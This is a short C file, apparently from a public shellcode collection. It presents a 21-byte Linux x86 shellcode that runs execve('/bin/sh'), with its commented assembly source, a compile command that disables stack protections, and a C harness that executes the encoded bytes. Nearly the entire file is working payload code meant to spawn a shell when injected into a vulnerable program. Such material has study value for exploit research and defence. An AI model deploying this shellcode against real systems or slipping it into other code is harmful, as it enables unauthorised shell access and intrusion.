/*
    #
    # Execve /bin/sh Shellcode Via Push (Linux x86 21 bytes)
    #
    # Dying to be the shortest.
    #
    # Copyright (C) 2015 Gu Zhengxiong (rectigu@gmail.com)
    #
    # 18 February 2015
    #
    # GPL
    #


    .global _start
_start:
    # char *const argv[]
    xorl %ecx, %ecx

    # 2 bytes, and both %eax and %edx were zeroed
    mull %ecx

    # __NR_execve 11
    movb $11, %al

    # for '\x00'
    pushl %ecx
    # 'h' 's' '/' '/'
    pushl $0x68732f2f
    # 'n' 'i' 'b' '/'
    pushl $0x6e69622f

    # const char *filename
    movl %esp, %ebx

    int $0x80
 */

/*
  gcc -z execstack -m32 push.c

  uname -r
  3.19.3-3-ARCH
 */

#include <stdio.h>
#include <string.h>

int
main(void)
{
  char *shellcode = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68"
    "\x2f\x62\x69\x6e\x89\xe3\xcd\x80";

    printf("strlen(shellcode)=%d\n", strlen(shellcode));

  ((void (*)(void))shellcode)();

  return 0;
}